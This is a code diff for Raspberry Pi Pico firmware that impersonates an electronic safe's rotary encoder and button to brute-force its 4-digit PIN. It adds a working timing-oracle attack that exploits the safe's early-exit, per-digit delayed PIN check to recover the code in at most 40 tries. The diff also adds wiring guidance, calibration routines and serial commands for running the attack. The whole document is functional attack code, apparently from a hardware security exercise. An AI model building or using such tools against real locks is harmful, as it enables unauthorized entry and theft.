@@ -3,9 +3,10 @@
 //
 // An attacker Raspberry Pi Pico impersonates the safe's rotary encoder + push
 // button, so the 4-digit PIN can be swept without a human turning the knob.
-// This is the "dumb" variant: a plain 0000..9999 sweep at an adjustable rate.
-// A timing-oracle-driven variant (>= 40 tries instead of 10000) can be layered
-// on later; see the report.
+// Two modes:
+//   * plain sweep -- 0000..9999 (or a neighbourhood) at an adjustable rate ('g')
+//   * timing oracle -- <= 40 dials, driven by the safe's per-digit check delay
+//     measured on the SENSE line ('o'; see "Timing oracle" below)
 //
 // TARGET (the safe, an RP2040) — established from firmware `board_gpio_init`:
 //   all three lines are INPUTs with pull-ups, active LOW.
@@ -18,7 +19,10 @@
 //   Pico GP3  (B_OUT)  ->  target B line  (encoder pin B  / net of GPIO 27)
 //   Pico GP4  (SW_OUT) ->  target SW line (button pin     / net of GPIO 28)
 //   Pico GND           ->  target GND     (RP2040 ground / debug-header GND)
-//   Pico GP5  (SENSE)  ->  optional: an unlock indicator on the target (off by default)
+//   Pico GP5  (SENSE)  ->  a target output LED, for the timing oracle (off by
+//                          default; enable with 'e'). Best pick: GPIO 10 -- it
+//                          blinks while idle, drives the reject-blink, and
+//                          latches on unlock. Find an active pin with 'm'.
 //
 //   DO NOT connect the two boards' 3V3 / VBUS together — each is self-powered,
 //   sharing a rail risks back-powering. Only GND + the 3 signal lines.
@@ -86,6 +90,38 @@ static uint32_t ATTEMPT_GAP_US = 150000; // between attempts
 // ------------------------------- Sense (opt) -------------------------------
 static bool SENSE_ENABLE = false;	  // watch PIN_SENSE for unlock
 static int SENSE_ACTIVE_LEVEL = HIGH; // level that means "unlocked"
+
+// ------------------------------ Timing oracle ------------------------------
+// The safe's PIN check (firmware board_gpio_init) compares the 4 entered digits
+// against the reference BYTE-BY-BYTE with an early exit, and calls sleep_ms(50)
+// for EACH matching leading digit before it either unlocks (all 4) or plays the
+// ~1.2 s reject animation. Crucially, sleep_ms is a plain busy-wait/WFE that
+// touches NO GPIO, and the whole display-refresh + blink loop is frozen while it
+// runs. So after the 4th button release, every target output (segment GPIO 0..9,
+// position GPIO 10..13) holds still for exactly 50 ms * k, where k = length of
+// the matching PIN prefix (0..4). We recover k by measuring that freeze on a
+// SENSE line wired to one of those outputs (GPIO 10 is the best pick: it blinks
+// while idle, drives the reject animation, and latches SET on unlock).
+//
+// This turns brute force from 10^4 into <= 40 dials: for each position sweep the
+// candidate digit 0..9, measure k; the correct digit is the unique one whose k
+// jumps to >= pos+1. See the 'o' (oracle attack), 't' (single think-time probe)
+// and 'm' (SENSE monitor / pin finder) commands.
+
+// One matching leading digit adds this many ms of freeze (firmware sleep_ms(50)).
+static uint32_t ORACLE_STEP_MS = 50;
+// Fixed offset added to every measured freeze: the target's poll tick before it
+// enters the check, plus wiring/sampling slack. Calibrate with 't' (see below).
+static uint32_t ORACLE_BASE_MS = 0;
+// Edges within this guard window after the 4th release are the "entry churn"
+// (target latching the digit); the freeze we care about starts inside it.
+static uint32_t ORACLE_START_GUARD_MS = 15;
+// How long to watch SENSE after the 4th release. Must exceed max freeze
+// (4*50 = 200 ms) with margin, but stay below the reject animation (~1.2 s).
+static uint32_t ORACLE_WINDOW_MS = 700;
+// SENSE polling period while measuring. 50 us >> digitalRead cost at 125 MHz and
+// resolves the 50 ms quantum ~1000x over.
+static uint32_t SENSE_SAMPLE_US = 50;
 
 // --------------------------------- Speed -----------------------------------
 // THE speed knob. Overall sweep-rate multiplier applied to every timing above
@@ -229,6 +265,99 @@ static bool senseUnlocked()
 	return true;
 }
 
+// --------------------------- Timing-oracle probe ---------------------------
+// Watch SENSE right after the 4th button release and return the length (ms) of
+// the longest "frozen" (no-edge) interval that STARTS within the entry guard
+// window. That freeze is the target's sleep_ms(50)*k while it checks the PIN, so
+// its length encodes k (the matching-prefix length). Returns -1 if SENSE is off.
+// Call with t0 == the instant SW was released (do not burn RELEASE_US first).
+static long measureFreezeMs()
+{
+	if (!SENSE_ENABLE)
+		return -1;
+	const uint32_t windowUs = ORACLE_WINDOW_MS * 1000u;
+	const uint32_t guardUs = ORACLE_START_GUARD_MS * 1000u;
+	const uint32_t t0 = micros();
+	int last = digitalRead(PIN_SENSE);
+	uint32_t lastEdgeUs = 0; // time of the most recent edge, relative to t0
+	uint32_t bestQuietLen = 0;
+	for (;;)
+	{
+		uint32_t now = micros() - t0;
+		if (now >= windowUs)
+			break;
+		int v = digitalRead(PIN_SENSE);
+		if (v != last)
+		{
+			uint32_t quietLen = now - lastEdgeUs;	 // interval that just ended
+			if (lastEdgeUs <= guardUs && quietLen > bestQuietLen)
+				bestQuietLen = quietLen; // a freeze candidate (starts in guard)
+			last = v;
+			lastEdgeUs = now;
+		}
+		delayMicroseconds(SENSE_SAMPLE_US);
+	}
+	// Tail: no edge until the window closed (large k, or an unlock latch).
+	uint32_t tailLen = windowUs - lastEdgeUs;
+	if (lastEdgeUs <= guardUs && tailLen > bestQuietLen)
+		bestQuietLen = tailLen;
+	return (long)((bestQuietLen + 500u) / 1000u); // round to ms
+}
+
+// Convert a measured freeze (ms) into a matching-prefix length k in 0..4.
+static int kFromFreeze(long freezeMs)
+{
+	if (freezeMs < 0)
+		return -1;
+	long adj = freezeMs - (long)ORACLE_BASE_MS;
+	if (adj < 0)
+		adj = 0;
+	long k = (adj + (long)ORACLE_STEP_MS / 2) / (long)ORACLE_STEP_MS;
+	if (k < 0)
+		k = 0;
+	if (k > 4)
+		k = 4;
+	return (int)k;
+}
+
+// Press the (4th) button and immediately measure the check freeze. Unlike
+// press(), the SENSE clock starts at the release edge -- no RELEASE_US wait
+// beforehand -- so the whole 50ms*k freeze is captured.
+static long pressMeasureFreeze()
+{
+	setLine(PIN_SW, 0);
+	waitUs(PRESS_US);
+	setLine(PIN_SW, 1); // release edge == t0 inside measureFreezeMs()
+	return measureFreezeMs();
+}
+
+// Enter a 4-digit code and, on the 4th press, measure the think-time freeze.
+// Returns the measured freeze in ms (-1 if SENSE off). Leaves ~enough idle time
+// for the target's reject animation (~1.2 s) to finish before the next attempt,
+// so the target is back at digit-0 input. Believed digit is reset per
+// RESET_AFTER_* just like doAttempt().
+static long thinkTimeOf(int d0, int d1, int d2, int d3)
+{
+	const int d[4] = {d0, d1, d2, d3};
+	for (int i = 0; i < 3; i++) // first three digits: ordinary confirm
+	{
+		enterDigit(d[i]);
+		press();
+		if (RESET_AFTER_PRESS >= 0)
+			g_believed = RESET_AFTER_PRESS;
+		waitUs(DIGIT_GAP_US);
+	}
+	enterDigit(d[3]); // fourth digit triggers the check
+	long freeze = pressMeasureFreeze();
+	// Let the reject animation drain so the next attempt starts clean.
+	waitUs((ORACLE_WINDOW_MS + 1400u) * 1000u - PRESS_US);
+	if (RESET_AFTER_ATTEMPT >= 0)
+		g_believed = RESET_AFTER_ATTEMPT;
+	else
+		g_believed = INITIAL_VALUE; // reject animation reset the display
+	return freeze;
+}
+
 // Enter and confirm one 4-digit code. Returns true if an unlock was sensed.
 static bool doAttempt(int d0, int d1, int d2, int d3)
 {
@@ -270,6 +399,10 @@ static void printStatus()
 				  (unsigned long)EDGE_US, (unsigned long)DETENT_GAP_US, (unsigned long)PRESS_US,
 				  (unsigned long)RELEASE_US, (unsigned long)DIGIT_GAP_US, (unsigned long)CHECK_US,
 				  (unsigned long)ATTEMPT_GAP_US);
+	Serial.printf("[oracle] sense=%s step=%lums base=%lums guard=%lums win=%lums\r\n",
+				  SENSE_ENABLE ? "ON" : "OFF", (unsigned long)ORACLE_STEP_MS,
+				  (unsigned long)ORACLE_BASE_MS, (unsigned long)ORACLE_START_GUARD_MS,
+				  (unsigned long)ORACLE_WINDOW_MS);
 }
 
 static void printHelp()
@@ -291,6 +424,11 @@ static void printHelp()
 	Serial.println(F("  j<n> jump to attempt n   (e.g. j3952)"));
 	Serial.printf("Speed:  +/- change by 25%%  (10..%d%%, boot=%d%%)\r\n",
 				  SPEED_MAX_PCT, SWEEP_SPEED_PCT);
+	Serial.println(F("Timing oracle (<=40 dials, needs SENSE on an active target GPIO):"));
+	Serial.println(F("  e  toggle SENSE on/off     o  run byte-by-byte oracle attack"));
+	Serial.println(F("  m<sec> monitor SENSE edges (find an active pin: probe GPIO 10-13/0-9)"));
+	Serial.println(F("  t<code> probe think-time of a code (calibration; e.g. t3952 -> k=4)"));
+	Serial.println(F("  B<ms> set oracle base    S<ms> set oracle step (~50)"));
 	Serial.println(F("Misc:   ?  status          h  this help"));
 }
 
@@ -363,6 +501,143 @@ static void enterKnownPin(int pin)
 	g_speedPct = savedSpeed; // restore sweep speed
 	if (wasRunning)
 		Serial.println(F("[known] note: sweep was running; left paused. 'g' to resume."));
+}
+
+// ----------------------------- Oracle attack -------------------------------
+// Byte-by-byte timing attack: <= 40 dials instead of 10000. For each position
+// 0..3, sweep the candidate digit 0..9 with the already-recovered prefix fixed
+// and the rest zero; the correct digit is the unique one whose think-time k
+// jumps to >= pos+1. Break as soon as it is found (avg ~22 dials, worst 40).
+// Requires SENSE wired to an active target output (see 'm') and ORACLE_STEP_MS /
+// ORACLE_BASE_MS calibrated with 't' (see printHelp).
+static void oracleAttack()
+{
+	if (!SENSE_ENABLE)
+	{
+		Serial.println(F("[oracle] SENSE is OFF. Enable with 'e', wire it to an "
+						 "active target GPIO (10 best), and calibrate with 't'."));
+		return;
+	}
+	Serial.println(F("[oracle] byte-by-byte timing attack (<=40 dials). 's' aborts."));
+	g_running = false; // never interleave with the plain sweep
+	int known[4] = {0, 0, 0, 0};
+	for (int pos = 0; pos < 4; pos++)
+	{
+		int bestDigit = -1, bestK = -1;
+		long bestFreeze = -1;
+		for (int cand = 0; cand <= 9; cand++)
+		{
+			if (Serial.available() && (Serial.peek() == 's' || Serial.peek() == 'S'))
+			{
+				Serial.read();
+				idleLines();
+				Serial.println(F("[oracle] aborted"));
+				return;
+			}
+			int d[4] = {0, 0, 0, 0};
+			for (int i = 0; i < pos; i++)
+				d[i] = known[i];
+			d[pos] = cand;
+			idleLines();
+			g_believed = INITIAL_VALUE;
+			long f = thinkTimeOf(d[0], d[1], d[2], d[3]);
+			int k = kFromFreeze(f);
+			Serial.printf("[oracle] pos=%d cand=%d -> freeze=%ldms k=%d\r\n", pos, cand, f, k);
+			if (k > bestK || (k == bestK && f > bestFreeze))
+			{
+				bestK = k;
+				bestFreeze = f;
+				bestDigit = cand;
+			}
+			if (k >= pos + 1) // unique correct digit for this position
+				break;
+		}
+		if (bestDigit < 0 || bestK < pos + 1)
+		{
+			Serial.printf("[oracle] pos=%d: no candidate raised k to %d -- SENSE "
+						  "wiring or ORACLE_STEP/BASE calibration is off. Abort.\r\n",
+						  pos, pos + 1);
+			return;
+		}
+		known[pos] = bestDigit;
+		Serial.printf("[oracle] pos=%d LOCKED digit=%d (k=%d). prefix so far=%d%d%d%d\r\n",
+					  pos, bestDigit, bestK, known[0], known[1], known[2], known[3]);
+	}
+	int pin = known[0] * 1000 + known[1] * 100 + known[2] * 10 + known[3];
+	Serial.printf("[oracle] recovered PIN=%04d -- entering to confirm...\r\n", pin);
+	idleLines();
+	g_believed = INITIAL_VALUE;
+	bool ok = doAttempt(known[0], known[1], known[2], known[3]);
+	idleLines();
+	if (ok)
+		Serial.printf("[oracle] SENSE unlock CONFIRMED at PIN=%04d\r\n", pin);
+	else
+		Serial.printf("[oracle] PIN=%04d entered; SENSE did not latch unlock "
+					  "(recheck ORACLE calibration / SENSE level, or watch the safe)\r\n",
+					  pin);
+}
+
+// Watch SENSE and report edge activity -- used on the bench to find which target
+// GPIO carries a useful signal. Probe pins 10..13 (position LEDs, one blinks
+// while idle) or 0..9 (segment LEDs) until this shows transitions.
+static void senseMonitor(long seconds)
+{
+	if (seconds < 1)
+		seconds = 3;
+	pinMode(PIN_SENSE, INPUT); // read regardless of SENSE_ENABLE
+	Serial.printf("[mon] watching SENSE (Pico GP%d) for %lds. Probe target "
+				  "GPIO 10-13 / 0-9 to find an active line.\r\n",
+				  PIN_SENSE, seconds);
+	uint32_t endMs = millis() + (uint32_t)seconds * 1000u;
+	int last = digitalRead(PIN_SENSE);
+	uint32_t edges = 0, minGap = 0xffffffffu, maxGap = 0, lastEdge = micros();
+	uint32_t hi = 0, tot = 0;
+	while ((int32_t)(millis() - endMs) < 0)
+	{
+		int v = digitalRead(PIN_SENSE);
+		tot++;
+		if (v)
+			hi++;
+		if (v != last)
+		{
+			uint32_t now = micros(), gap = now - lastEdge;
+			if (gap < minGap)
+				minGap = gap;
+			if (gap > maxGap)
+				maxGap = gap;
+			lastEdge = now;
+			edges++;
+			last = v;
+		}
+		delayMicroseconds(200);
+	}
+	Serial.printf("[mon] edges=%lu duty(high)=%lu%% minGap=%luus maxGap=%luus\r\n",
+				  (unsigned long)edges, (unsigned long)(tot ? hi * 100 / tot : 0),
+				  (unsigned long)(edges ? minGap : 0), (unsigned long)(edges ? maxGap : 0));
+	if (edges == 0)
+		Serial.println(F("[mon] no transitions -- this pin is static; try another GPIO"));
+}
+
+// Enter one code and print the measured think-time -- calibrate ORACLE_BASE_MS /
+// ORACLE_STEP_MS. Probe the known PIN (k=4) and a code whose 1st digit is wrong
+// (k=0): BASE ~= freeze(k=0), STEP ~= (freeze(k=4)-BASE)/4 (expect ~50).
+static void thinkProbe(int code)
+{
+	if (!SENSE_ENABLE)
+	{
+		Serial.println(F("[probe] SENSE is OFF -- enable with 'e' first"));
+		return;
+	}
+	int d0 = (code / 1000) % 10, d1 = (code / 100) % 10;
+	int d2 = (code / 10) % 10, d3 = code % 10;
+	idleLines();
+	g_believed = INITIAL_VALUE;
+	Serial.printf("[probe] entering %d%d%d%d, measuring think-time...\r\n", d0, d1, d2, d3);
+	long f = thinkTimeOf(d0, d1, d2, d3);
+	idleLines();
+	Serial.printf("[probe] freeze=%ldms -> k=%d (step=%lums base=%lums guard=%lums win=%lums)\r\n",
+				  f, kFromFreeze(f), (unsigned long)ORACLE_STEP_MS, (unsigned long)ORACLE_BASE_MS,
+				  (unsigned long)ORACLE_START_GUARD_MS, (unsigned long)ORACLE_WINDOW_MS);
 }
 
 static void handleChar(int c)
@@ -443,6 +718,52 @@ static void handleChar(int c)
 	case 'k':
 		enterKnownPin(KNOWN_PIN);
 		break;
+	case 'e':
+		SENSE_ENABLE = !SENSE_ENABLE;
+		pinMode(PIN_SENSE, INPUT);
+		Serial.printf("[cfg] SENSE=%s (Pico GP%d, active=%s)\r\n",
+					  SENSE_ENABLE ? "ON" : "OFF", PIN_SENSE,
+					  SENSE_ACTIVE_LEVEL == HIGH ? "HIGH" : "LOW");
+		break;
+	case 'o':
+		oracleAttack();
+		break;
+	case 'm':
+	{
+		long n = readNumberArg();
+		senseMonitor(n > 0 ? n : 3);
+	}
+	break;
+	case 't':
+	{
+		long n = readNumberArg();
+		thinkProbe(n >= 0 ? (int)n : KNOWN_PIN);
+	}
+	break;
+	case 'B':
+	{
+		long n = readNumberArg();
+		if (n >= 0)
+		{
+			ORACLE_BASE_MS = (uint32_t)n;
+			Serial.printf("[cfg] oracle base=%lums\r\n", (unsigned long)ORACLE_BASE_MS);
+		}
+		else
+			Serial.println(F("[cfg] usage: B<ms>"));
+	}
+	break;
+	case 'S':
+	{
+		long n = readNumberArg();
+		if (n >= 1)
+		{
+			ORACLE_STEP_MS = (uint32_t)n;
+			Serial.printf("[cfg] oracle step=%lums\r\n", (unsigned long)ORACLE_STEP_MS);
+		}
+		else
+			Serial.println(F("[cfg] usage: S<ms> (firmware sleep_ms per digit, ~50)"));
+	}
+	break;
 	case '+':
 		g_speedPct = min(SPEED_MAX_PCT, g_speedPct + 25);
 		Serial.printf("[speed] %d%%\r\n", g_speedPct);
